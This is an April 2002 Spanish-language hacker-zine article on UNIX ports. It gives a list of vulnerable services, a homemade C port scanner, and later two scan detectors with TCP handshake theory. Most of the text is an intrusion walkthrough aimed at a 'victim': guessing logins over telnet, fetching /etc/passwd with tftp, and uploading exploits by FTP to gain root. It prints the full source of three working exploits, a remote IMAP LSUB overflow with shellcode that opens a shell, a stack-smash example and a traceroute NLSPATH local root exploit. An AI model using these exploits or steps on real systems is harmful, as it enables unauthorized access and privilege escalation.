@@ -1,0 +1,898 @@
+                            
+                      /===================\
+                      |  Puertos en UNIX  |==============\
+                      \===================/              /
+                                                     by SHYSAP
+
+
+1.  INTRODUCCION
+
+La exploracion de puertos es la pauta principal que debemos llevar a cabo
+a la hora de juntar informacion para luego introducirnos en el sistema.
+De que nos sirve saber que puertos tiene abiertos la maquina? Facil, a 
+traves de ellos, cuando estan en estado listening o en escucha, o abiertos 
+podemos sacar informacion valiosa, como por ej el 79(finger, un poco 
+anticuado ya), pero lo mas importante es que podemos, mediante algunos, 
+meternos en el sistema, como por ej. el 23(telnet) consiguiendo una shell, 
+o tambien conseguir una shell mediante los servicios Berkley R: rlogin y rsh
+(513 y 514)...pero igualmente no me voy a poner a explicar diferencias entre 
+los TCP, ¿y los UDP?, o para que nos sirve cada uno en especial(recuerden 
+que esto es todo practico, aunque hay un poco de teoria). Hablare sobre 
+tecnicas de explotacion y exploracion de los mismos en general.
+Pero...¿que es un puerto?
+Un puerto es un recurso del sistema que esta controlado por un demonio o
+daemon. Cada proceso o daemon tiene asignado un puerto diferente. Por ej.
+el puerto 21, con el demonio FTPd, el 23, con telnetd o el 80 con HTTPd.
+
+
+
+2.  UN PEQUEÑO LISTADO DE PUERTOS
+
+A continuacion no voy a escribir los mas de 131.000 puertos TCP/UDP, sino que 
+voy a escribir una lista reducida al numero de puertos, potencialmente
+vulnerables de diferentes sistemas operativos.
+Para una lista mas completa:   /etc/services   o  
+ftp://ftp.isi.edu/in-notes/iana/assignments/port-numbers o en el respectivo RFC.
+
+
+SERVICIO o APLICACION                                   PUERTO/PROTOCOLO
+
+echo                                                    7/tcp
+systat                                                  11/tcp
+chargen                                                 19/tcp
+ftp                                                     21/tcp
+ssh                                                     22/tcp
+telnet						        23/tcp					 
+smtp							25/tcp
+nameserver						42/tcp
+whois						   	43/tcp
+tacacs							49/udp
+dns-lookup						53/udp
+dns-zone						53/tcp
+oracle-sqlnet						66/tcp
+tftp							69/udp
+finger							79/tcp
+http							80/tcp
+Puerto web alternativo(http)				81/tcp
+Kerberos o Puerto web alternativo(http)			88/tcp
+pop2							109/tcp
+pop3							110/tcp
+sunrpc							111/tcp
+sqlserv							118/tcp
+nntp							119/tcp
+ntrpc-or-dce						135/tcp
+netbios							139/tcp
+imap							143/tcp
+snmp							161/udp
+snmp-trap						162/udp
+bgp							179/tcp
+snmp-checkpoint						256/tcp
+ldap							389/tcp
+netware-ip						396/tcp
+timbuktu						407/tcp
+https/ssl						443/tcp
+ms-smb-alternate					445/tcp/udp			
+ipsec-intercambio-clave-internet(ike)			500/udp
+rlogin							513/tcp
+rwho							513/udp
+rsh							514/tcp
+syslog							514/udp
+printer							515/tcp
+printer							515/udp
+router							520/udp
+netware-ncp						524/tcp
+remotelypossible					799/tcp
+socks							1080/tcp
+bmc-patrol-db						1313/tcp
+notes							1352/tcp
+ms-sql							1433/tcp
+citrix							1494/tcp
+sybase-sql-anywhere					1498/tcp				
+ingres-lock						1524/tcp
+oracle-srv						1525/tcp
+oracle-tli						1527/tcp
+pptp							1723/tcp
+winsock-proxy						1745/tcp
+remotely-anywhere					2000/tcp
+cisco-mgmt						2001/tcp
+nfs							2049/tcp
+compaq-web						2301/tcp
+openview						2447/tcp
+realsecure						2998/tcp
+ms-active-dir-global-catalog				3268/tcp/udp
+bmc-patrol-agent					3300/tcp
+mysql							3306/tcp
+ssql							3351/tcp
+ms-termserv						3389/tcp
+cisco-mgmt						4001/tcp
+nfs-lockd						4045/tcp
+pcanywhere						5631/tcp
+vnc							5800/tcp
+xwindows						6000/tcp
+cisco-mgmt						6001/tcp
+apc							6549/tcp
+irc							6667/tcp
+web							8000/tcp
+web							8001/tcp
+web							8002/tcp
+web							8080/tcp
+cisco-xremote						9001/tcp
+netbus							12345/tcp
+quake							26000/tcp
+backorifice						31337/udp
+rpc-solaris						32771/tcp
+snmp-solaris						32780/udp
+reachout						43188/tcp
+pcanywhere-def						65301/tcp
+
+
+
+3.  AVERIGUAR QUE PUERTOS ESTAN ABIERTOS  Y  EXPLOTARLOS(bo0m!)
+
+A la hora de averiguar los open ports, yo recomiendo el uso del nmap, ya que 
+permite el escaneo de puertos tanto TCP como UDP, ademas es "invisible",
+esto quiere decir que cuando escaneemos alguna maquina, no van a quedar logs 
+de nuestro paso por alli (y tiene maravillosos usos mas). Esta herramienta
+(hecha por Fyodor) fundamental, la pueden encontrar en www.insecure.org/nmap.
+Sino tambien pueden usar un scanner hecho por mi, aunque sea facilmente 
+detectable y filtrable: el mps (mal0r port scanner).  	
+
+----------------------------------mps.c----------------------------------------
+
+/**********************************************************************
+ *             C0d3d  by  SHYSAP ---->shysap@web-mail.com.ar         *
+ *                                                                    *
+ *             from mal0r team  ---->www.malorteam.com.ar             *
+ *                                                                    *
+ *                   (malor port scanner)                             *
+ *                          mps.c                                     *
+ *       "Un simple escanner de puertos TCP para Linux"               *
+ **********************************************************************/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <strings.h>
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+main(int argc, char *argv[])
+{
+
+   int sock, h, puerto, lo = 0, hi = 0;
+   struct sockaddr_in ellos;
+   struct hostent *host;
+   struct servent *serv;
+
+   if (argc < 3)
+   {
+      printf("\n\nUso: ./%s <ip> <puerto bajo> <puerto alto>\n\n", argv[0]);
+      return 0;
+   }
+
+   if ((host = gethostbyname(argv[1])) == NULL)
+   {
+   	printf("\nLa IP no es valida\n");
+      return 0;
+   }
+   else
+     	h = inet_ntoa(*((struct in_addr*)host->h_addr));
+
+   lo = atoi(argv[2]);
+   hi = atoi(argv[3]);
+
+   printf("Buscando puertos abiertos en %s ...\n", argv[1]);
+
+   for (puerto = lo; puerto <= hi; puerto++)
+   {
+     	sock = socket(AF_INET, SOCK_STREAM, 0);
+   	ellos.sin_family = AF_INET;
+   	ellos.sin_port = htons(puerto);
+   	ellos.sin_addr.s_addr = inet_addr(h);
+		bzero(&(ellos.sin_zero), 8);
+
+      if (connect(sock, (struct sockaddr *)&ellos, sizeof(ellos)) < 0)
+      {
+      	close(sock);
+         continue;
+      }
+
+      serv = getservbyport(htons(puerto), "tcp");
+
+      printf("\nPuerto  %d  abierto  <%s>\n", puerto, serv);
+
+      if (serv == NULL)
+      	printf("Desconocido\n");
+      else
+         serv->s_name;
+
+      close(sock);
+   }
+	return 0;
+}
+
+----------------------------------mps.c----------------------------------------
+
+
+Casi todos los scanners les van a dar un resultado parecido a este:
+
+21    open    ftp
+22    open    ssh
+23    open    telnet
+25    open    smtp
+79    open    finger
+80    open    http
+143   open    imap
+..etc..
+
+que debemos hacer ahora? Bueno yo recomiendo, para empezar, hacer telnet al 79
+y ver si conseguimos algo de informacion para luego sacar alguna cuenta en
+telnet. Seguramente(an casi todos los casos), este puerto lo van a encontrar
+cerrado, asi que pasemos directo a telnet(deben tener nocion de como usarlo,
+no lo voy a explicar), dense una vuelta por http://packetstormsecurity.nl y
+bajense algun exploit remoto(de acuerdo a versiones de programas que tenga
+la victima,ej. sendmail en el puerto 25) para ver si consiguen una shell$
+remota(es decir desde su maquina conseguir una en la otra). Si llegamos a 
+conseguir acceso, tenemos que probar subir por ftp(o bien tftp) algun exploit 
+local que hayamos conseguido, para hacernos root ;)
+...Aca dejo dos exploits:
+
+imapd: te consigue una shell remota por un bug en el imap...
+desbpila: te hace root...(en ALGUNOS linux)
+bug-traceroute: te hace root...
+---------------------------------------imapd-----------------------------------
+/*
+ *
+ *  imapd IMAP4rev1 v12.261, v12.264 and 2000.284 Remote Exploit. Others? Yes!
+ *
+ *  By: SkyLaZarT ( fcerqueira@bufferoverflow.org ) .aka. Felipe Cerqueira
+ *  Homepage: www.BufferOverflow.Org
+ *  Thankz: cync, oldm and Jans. ( BufferOverflow.org Team )
+ *		Antonio Marcelo and Felipe Saraiva
+ *
+ */
+
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <errno.h>
+#include <signal.h>
+
+#include <sys/socket.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+#define SIZE		1064
+#define NOP		0x90
+#define RET12261	0xbffff3ec
+#define RET12264	0xbffff4e0
+#define RET12264ZOOT	0xbffff697
+#define RET2000_284	0xbfffebc8
+
+#define INIT(x)	bzero(x, sizeof(x))
+#define READ(sock,x) read(sock, x, sizeof(x))
+
+
+#define TIMEOUT		20
+
+char shellcode[] =
+        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+        "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+int debug = 0;
+
+
+void openshell(int sock, int check);
+void processSignal(int signum);
+
+void processSignal(int signum) {
+	fprintf(stderr, "Time out!!\n");
+	exit(-1);
+}
+
+
+void openshell(int sock, int check) {
+	char buffer[1024];
+	fd_set rset;
+	int i;
+
+	while(1) {
+		FD_ZERO(&rset);
+		FD_SET(sock, &rset);
+		FD_SET(fileno(stdin), &rset);
+
+		select(sock + 1, &rset, NULL, NULL, NULL);
+
+		if (FD_ISSET(sock, &rset)) {
+			if ((i = read(sock, buffer, sizeof(buffer))) <= 0) {
+				fprintf(stderr, "Connection terminated!\n");
+				close(sock);
+				exit(-1);
+			} else {
+				buffer[i] = 0x00;
+				if(check) {
+					if (!(strstr(buffer, "uid"))) {
+						fprintf(stderr, "Exploit failed\n");
+						exit(-1);
+					} else {
+						fprintf(stderr, "Exploit Success!!\n");
+						check = 0;
+					}
+				}
+
+				puts(buffer);
+			}
+		}
+
+		if (FD_ISSET(fileno(stdin), &rset)) {
+			if ( check ) write(sock, "id\n", 3);
+
+			if ((i = read(fileno(stdin), buffer,
+					sizeof(buffer))) > 0) {
+				buffer[i] = 0x00;
+				write(sock, buffer, i);
+			}
+		}
+	}
+}
+
+
+int main(int argc, char **argv) {
+	char buffer[SIZE], sockbuffer[2048];
+	char *login, *password;
+	long retaddr;
+	struct sockaddr_in sin;
+	struct hostent *hePtr;
+	int sock, i;
+
+	fprintf(stderr, "\nRemote exploit for IMAP4rev1 v12.261, v12.264 and 2000.284\n"
+		"Developed by SkyLaZarT - www.BufferOverflow.org\n\n");
+
+	if ( argc < 5 ) {
+		fprintf(stderr, "%s <host> <login> <password> <type> [offset]\n", argv[0]);
+		fprintf(stderr, "\ttype: [0]\tSlackware 7.0 with IMAP4rev1 v12.261\n"
+				"\ttype: [1]\tSlackware 7.1 with IMAP4rev1 v12.264\n"
+				"\ttype: [2]\tRedHat 6.2 ZooT with IMAP4rev1 v12.264\n"
+				"\ttype: [3]\tSlackware 7.0 with IMAP4rev1 2000.284\n\n");
+
+
+		exit(-1);
+	}
+
+	login = argv[2];
+	password = argv[3];
+
+	switch(atoi(argv[4])) {
+		case 0: retaddr = RET12261; break;
+		case 1: retaddr = RET12264; break;
+		case 2: retaddr = RET12264ZOOT; break;
+		case 3: retaddr = RET2000_284; break;
+		default:
+			fprintf(stderr, "invalid type.. assuming default "
+				"type 0\n");
+			retaddr = RET12261; break;
+
+	}
+
+	if ( argc == 6 )
+		retaddr += atoi(argv[5]);
+
+	signal(SIGALRM, processSignal);	
+
+	fprintf(stderr, "Trying to exploit %s...\n", argv[1]);
+
+	fprintf(stderr, "Using return address 0x%08lx. Shellcode size: %i bytes\n\n", retaddr, strlen(shellcode));
+
+
+	alarm(TIMEOUT);
+	hePtr = gethostbyname(argv[1]);
+	if (!hePtr) {
+		fprintf(stderr, "Unknow hostname : %s\n", strerror(errno));
+		exit(-1);
+	}
+	alarm(0);
+
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+	if ( sock < 0 ) {
+		perror("socket()");
+		exit(-1);
+	}
+
+	sin.sin_family = AF_INET;
+	sin.sin_port = htons(143);
+	memcpy(&sin.sin_addr, hePtr->h_addr, hePtr->h_length);
+	bzero(&(sin.sin_zero), 8);
+
+	fprintf(stderr, "Connecting... "); 
+	alarm(TIMEOUT);
+	if ( connect(sock, (struct sockaddr *)&sin, sizeof(sin)) < 0 ) {
+		fprintf(stderr, "failed to %s:143\n", argv[1]);
+		exit(-1);
+	}
+	alarm(0);
+	
+	fprintf(stderr, "OK\n");
+
+	
+        for ( i = 0; i <= SIZE; i += 4 )
+                *(long *)&buffer[i] = retaddr;
+
+        for ( i = 0; i < ( SIZE - strlen(shellcode) - 100); i++ )
+                *(buffer+i) = NOP;
+
+        memcpy(buffer + i, shellcode, strlen(shellcode));
+
+	INIT(sockbuffer);
+	READ(sock, sockbuffer);
+
+	if(debug) fprintf(stderr, "debug %s", sockbuffer);	
+
+	fprintf(stderr, "Trying to loging ... ");
+
+	sprintf(sockbuffer, "1 LOGIN %s %s\n", login, password);
+	write(sock, sockbuffer, strlen(sockbuffer));
+	
+	INIT(sockbuffer);
+	READ(sock, sockbuffer);
+
+	if(debug) fprintf(stderr, "debug %s", sockbuffer);
+	
+	if (!(strstr(sockbuffer, "OK LOGIN completed"))) {
+		fprintf(stderr, "Login failed!!\n");
+		close(sock);
+		exit(-1);
+	}
+
+	fprintf(stderr, "OK\n");
+
+	INIT(sockbuffer);
+	sprintf(sockbuffer, "1 LSUB \"\" {1064}\r\n");
+	write(sock, sockbuffer, strlen(sockbuffer));
+
+        INIT(sockbuffer);
+        READ(sock, sockbuffer);
+
+	if(debug) fprintf(stderr, "debug %s", sockbuffer);
+
+	if(!(strstr(sockbuffer, "Ready"))) {
+		fprintf(stderr, "LSUB command failed\n");
+		close(sock);
+		exit(-1);
+	}
+
+	fprintf(stderr, "Sending shellcode... ");
+
+	write(sock, buffer, 1064);
+	write(sock, "\r\n", 2);
+
+	fprintf(stderr, "OK\n");
+
+	fprintf(stderr, "PRESS ENTER for exploit status!!\n\n");
+
+	openshell(sock, 1);
+
+	close(sock);
+
+	return 0;
+}
+---------------------------------------imapd-----------------------------------
+
+otro...
+
+-------------------------------------debpila-----------------------------------
+/*Consigue una shell root (no creo que ande, pero es un ejemplo)*/
+
+#include <stdio.h>
+
+char buffer[1040];
+int i;
+char *ptr;
+unsigned long *ptr2;
+
+main()
+{
+
+long get_sp(void)
+{
+__asm__("movl %esp,%eax\n");
+}
+char execshell[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+for(i=0;i<1040;i++)
+buffer[i]=0x00;
+ptr=buffer;
+
+for(i=0;i<1024-strlen(execshell);i++)
+*(ptr++)=0x90;
+for(i=0;i<strlen(execshell);i++)
+*(ptr++)=execshell[i];
+ptr2=(long *)ptr;
+for(i=0;i<4;i++)
+*(ptr2++)=get_sp()-1000;
+
+execl("./simple", "simple", buffer, 0);
+}
+
+-------------------------------------desbpila----------------------------------
+
+ootro mas! te hace root por un overflow, escribe la pila mediante la variable 
+nlspath...a probar suerte...
+
+------------------------------------bug-traceroute-----------------------------
+/*
+ *    traceroute-exploit (gives root via nlspath environment variable)
+ *  
+ *    (cambiar a conveniencia el path donde esta el traceroute)
+ *
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+  "\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+  "\xcd\x80/"
+  "/bin/sh"
+  "0";
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+#define bufsize 2048
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize - 4; i += 4)
+    *(char **)&buffer[i] = get_sp() - 3029;
+
+  memset(buffer, 0x90, 512);
+  memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+  buffer[bufsize - 1] = 0;
+
+  setenv("NLSPATH", buffer, 1);
+
+  execl("/usr/sbin/traceroute", "/usr/sbin/traceroute", NULL);
+}
+
+------------------------------------bug-traceroute-----------------------------
+-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--
+-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--
+Seguramente debe haber mas de un wannabe despistado:
+(estas xplicaciones son muy por arriba, ¡¡se supone que ALGOO sabes!!)
+
+¿como hago telnet al puerto 79(finger)?
+malor@team.com# telnet host_o_ip 79
+
+¿ya tengo la info, como saco la cuenta?
+malor@team.com# telnet host_o_ip
+Connected to...
+Escape character is `[
+login:(aca pones los nombres de users que sacaste)
+pass:(deducilo)
+
+¿como compilo los xploites?(si no te llegan a funcar bajatelos de packetstorm)
+gcc xploit.c -o xploit-haX0r
+
+¿como subo los locales a la otra maquina?
+malor@team.com# ftp
+ftp> open host_o_ip
+ftp> send xploit.c 
+ftp> ? o help, para mas info
+
+¿no les parece que me estoy llendo de tema?
+SI!!!
+ok, ok
+-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-
+-=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=--=-
+                                                                              
+...tambien podemos leer los ficheros /etc/passwd o el shadow /etc/shadow, hay 
+vastantes proggies para hacer esto, tambien lo podemos hacer manualmente con,
+por ej. el trivial file transfer protocol...(esta es una tecnica entre muchas,
+algun dia voy a escribir un capitulo completo sobre conseguir /etc/passwd)
+
+malor@team.com# tftp
+tftp> connect host_o_ip
+tftp> get /etc/passwd /tmp/haXor/passwd
+
+pero...
+mmm..y esto que tiene que ver con los puertos(en alguna otra ocasion tocare   
+mas en profundidad estos temas, ahora no viene al caso)                       
+!!!volvamos a lo nuestro!!!...uhh, pero ya es muy tarde(es de dia)...         
+                                                                              
+                                                                              
+                                                                              
+5.  DETECTANDO ESCANEOS DE PUERTOS                                            
+                                                                              
+Una de las principales formas de deteccion es fijandose en los logs, pero como 
+esto seguramente les va a parecer un tanto aburrido pueden conseguir programas 
+IDS(intruder detection system), aqui dejo uno que va a verificar todo intento 
+fallido de un explorador de puertos que produce un ACK/RST. 
+
+-----------------------------------portsec------------------------------------
+
+# deteccion de la exploracion de puertos:  -= portsec =-
+
+port_schema = library_schema:new( 1, [ "time", "ip", "int" ], scope () );
+time = 0;
+          count = 0;
+maxcount = 2;  # Numero maximo permitido de ACK/RST
+maxtime = 5;   # Tiempo maximo permitido para que ocurra maxcount
+source = 0;
+port = 0;
+target = 0;
+
+filter portscan ip ()
+{
+     if (tcp.is)
+     {
+              # buscar ACK, RST´s y, si tiene el mismo origen, contar
+              # solo uno
+
+              if (byte(ip.blob, 13) == 20 ) #bandera definida como ACK, RST
+              {
+                    count = count + 1;
+                   
+                    source = ip.dest;
+                    target = ip.source;
+                    port = tcp.sport;
+                    time = system.time;
+             }
+       }
+  on tick = timeout ( sec: maxtime, repeat ) call checkcount; 
+}
+
+func checkount
+{ 
+           if (count >>= maxcount)
+           {
+                 echo ("Port scan Georgie?, Time: ", time, "\n") ;
+                      record system.time, source, target, port
+                      to the_recorder_portscan;
+                 count = 0;
+       }
+       else
+                 count = 0;
+}
+the_recorder_portscan=recorder("bin/histogram packages/sandbox/portscan.cfg", port_schema");
+
+
+--------------------------portsec.c-------------------------------------------
+
+Aca les dejo otro que anda dando vueltas por la red y que da buenos resultados
+(al igual que el anterior, modifiquenlo a su conveniencia)
+
+--------------------------noselenombre.c--------------------------------------
+
+/* Detector de Scan TCP y UDP  */
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+#include <unistd.h> // if you want to improve the code for posix :)
+#include <time.h>
+#include <getopt.h>
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <sys/wait.h>
+
+#define TCPORT 45 // change this number, for a better program
+#define UDPORT 46 // this too
+#define MAXLOG 50
+#define _GNU_SOURCE
+
+main(int argc, char *argv[])
+{
+  time_t atime;
+  int parameter;
+  int sin_size;
+
+  if (argc == 1) // if nothing given like arguments
+    {
+      fprintf(stderr,"\nantilame : kill'em all :)\n\nBeware, lamer are everywhere in the world!\nantilame was builded for look on them 8-!\nlamer scan many time their imaginary targets whitout any discretion.\n\nantilame -d : wait for udp scans (sock_dgram)\nantilame -s : wait for tcp scans (sock_stream)\n\n");
+      return(1);
+    }
+
+  parameter = getopt(argc, argv, "sd");
+
+  switch(parameter)
+    {
+
+    // tcp
+    case 's' : {
+      int socket_tcp, socket_tcp_used;
+      struct sockaddr_in my_addr_tcp;
+      struct sockaddr_in their_addr_tcp;
+
+      if ((socket_tcp = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+	{
+	  perror("tcp socket");
+	  exit(1);
+	}
+ 
+      my_addr_tcp.sin_family = AF_INET;     
+      my_addr_tcp.sin_port = htons(TCPORT);  
+      my_addr_tcp.sin_addr.s_addr = INADDR_ANY;
+      memset(&(my_addr_tcp.sin_zero),0,8);
+
+      if (bind(socket_tcp, (struct sockaddr *)&my_addr_tcp, sizeof(struct sockaddr))== -1) 
+	{
+	  perror("tcp bind");
+	  exit(1);
+	}
+
+      if (listen(socket_tcp, MAXLOG) == -1) 
+	{
+	  perror("tcp listen");
+	  exit(1);
+	}
+      while(1) {  
+	sin_size = sizeof(struct sockaddr_in);
+
+	if ((socket_tcp_used = accept(socket_tcp, (struct sockaddr *)&their_addr_tcp, &sin_size)) == -1) 
+	  {
+	    perror("tcp accept");
+	    continue;
+	  }
+	atime = time(NULL);
+	printf("%s : %s >is scanning you!!(tcp)\n", inet_ntoa(their_addr_tcp.sin_addr),ctime(&atime));
+	close(socket_tcp_used);
+
+	while(waitpid(-1,NULL,WNOHANG) > 0);
+      }
+      break;
+    }
+
+    // udp
+    case 'd' : {
+      int socket_udp;
+      struct sockaddr_in my_addr_udp;
+      struct sockaddr_in their_addr_udp;
+      char buf[MAXLOG];
+      int received;
+      
+      if ((socket_udp = socket(AF_INET, SOCK_DGRAM, 0)) == -1) 
+        {
+	  perror("udp socket");
+	  exit(1);
+	}
+
+      my_addr_udp.sin_family = AF_INET;
+      my_addr_udp.sin_port = htons(UDPORT);
+      my_addr_udp.sin_addr.s_addr = INADDR_ANY;
+      memset(&(my_addr_udp.sin_zero),0,8); 
+
+      if (bind(socket_udp, (struct sockaddr *)&my_addr_udp, sizeof(struct sockaddr))== -1)
+	{
+	  perror("udp bind");
+	  exit(1);
+	}   	
+
+    	sin_size = sizeof(struct sockaddr_in);
+	while(1) {
+      if ((received=recvfrom(socket_udp, buf, MAXLOG, 0, (struct sockaddr *)&their_addr_udp, &sin_size)) == -1)
+	{
+	  perror("udp recvfrom");
+	  exit(1);
+	}
+	atime = time(NULL);
+	printf("%s : %s >is scanning you!!(udp)\n", inet_ntoa(their_addr_udp.sin_addr),ctime(&atime));      
+    	
+      close(socket_udp);
+	}
+      break;
+    }
+
+    }
+  return 0;
+}
+
+--------------------------noselenombre.c--------------------------------------
+
+NOTA para NEWBIES:¿que es eso de que se produce un ACK/RST?
+
+Para explicar esto es necesario explicar la teoria de TCP/IP, cosa que hare 
+muuy muy resumida a continuacion(para mas informacion busquen el TCP/IP 
+ilustrado, o algun otro texto que explique esta teoria); ademas hago esto 
+porque(aunque no venga al caso) el fin de la revista es la difusion de info a 
+TODOS y se que hay mas de uno que no sabe esto:
+ 
+
+¿Como se da la coneccion TCP?
+
+Cuando un sistema A, cliente, se quiere conectar a un sistema B, servidor, 
+el sist A envia un paquete SYN desde un determinado puerto suyo, a un 
+determinado puerto del sist B, que este en estado de escucha, es decir este
+en estado SYN_RECV. Luego el sist B enviara un paquete SYN/ACK al sist. Si 
+todo va bien el sist A le devolvera al B un paquete del tipo ACK. Finalizado
+este proceso, tambien llamado "acuerdo TCP de tres vias", la coneccion estara 
+establecida. A continuacion un grafico mostrando la conexion TCP:
+
+==================================================================
+                         Paquete SYN
+*cliente - sistema A*  --------------->  *servidor - sistema B*
+==================================================================
+                        Paquete SYN/ACK
+*cliente - sistema A*  <---------------  *servidor - sistema B*  
+==================================================================
+                         Paquete ACK
+*cliente - sistema A*  --------------->  *servidor - sistema B*  
+==================================================================
+                     CONEXION ESTABLECIDA
+
+
+¿Porque se produce un ACK/RST?
+
+Los ports scanners envian peticiones de conexion a determinados puertos de la
+maquina que, si se encuentran cerrados(o en estado de no escucha), luego de la 
+peticion SYN, hecha por el cliente(el scanner), el servidor respondera con un 
+paquete RST/ACK, terminandose asi la conexion(reseteandose). Esto querra decir
+que el puerto esta cerrado. De lo contrario estara abierto.
+
+Ejemplo:
+Yo le digo a un portscanner que escannee(me diga si estan abiertos o a la 
+escucha), los puertos 21 y 23. El servidor tiene abierto solo el 21.
+Lo que el portscanner hara es enviar un paquete SYN a los puertos seleccionados
+anteriormente. En el caso del puerto 23 el servidor devolvera un RST/ACK, esto 
+quiere decir que no esta a la escucha el puerto 23(entendido?), pero en el caso 
+del 21 esto no pasara debido a que este puerto esta abierto, el servidor 
+devolvera un SYN/ACK permitindose asi la conexion (a este tipo de conexion se 
+la llama half open, que querria decir que no es una conexion completa sino a 
+medias). Lo que el scanner imprimira es:
+
+port    state    service
+21      open     ftp
+
+...al puerto 23 no lo pone debido a que la conexion no se pudo dar... 
+(lo anterior es solo uno de los tipos de escaneos: el escaneo TCP SYN)
+
+¿Que otros tipos de escaneos hay?
+
+Por ejemplo esta el TCP, que se basa en una conexion TCP basica y completa 
+(vista anteriormente), que cuando se establece la conexion querra decir que el 
+puerto esta abierto. De lo contrario estara cerrado. Tambien esta la 
+exploracion FIN que se basa en enviar un paquete FIN al puerto, devolviendole, 
+el otro sistema, un RST para todos los puertos que estan cerrados. Otra 
+tecnica, contra sistemas UNIX, es la exploracion RPC, que nos dira todos los 
+puertos de llamada a procedimientos remotos, ademas de numeros de versiones y 
+programas asociados. Por ejemplo el scanner mps (el codigo esta mas arriba), 
+se basa en una conexion TCP connect(). Que a su vez esta se basa en una 
+llamada al sistema, connect(). Esta tecnica es rapida pero tambien es ruidosa,
+por asi llamarla, ya que puede ser detectada facilmente (por ej mediante los 
+logs)y filtrada.
+
+Espero que hayan entendido, ya saben que por cualquier duda que les surga a 
+raiz de esto me pueden escribir. 
+
+
+
+4.  CONCLUSION Y DESPEDIDA
+
+Bueno creo que ahora van a entender mejor de que se trata el tema, y ademas 
+podran defenderse. Al menos espero que les haya servido...no duden en 
+consultarme por cualquier duda que tengan o algun tema que quieren que hable o 
+extienda (ya que algunos quedaron en el aire), tambien si tengo algun error de 
+concepto:
+
+   shysap@web-mail.com.ar
+
+saludos a vos que estas leyendo, al dr_fdisk^, a nAcHiTo, y a todos los demas!
+
+   <www.malorteam.com.ar> ---- a bIg LaMmE TeAM
+						
+Abril de 2002 ---  by SHYSAP
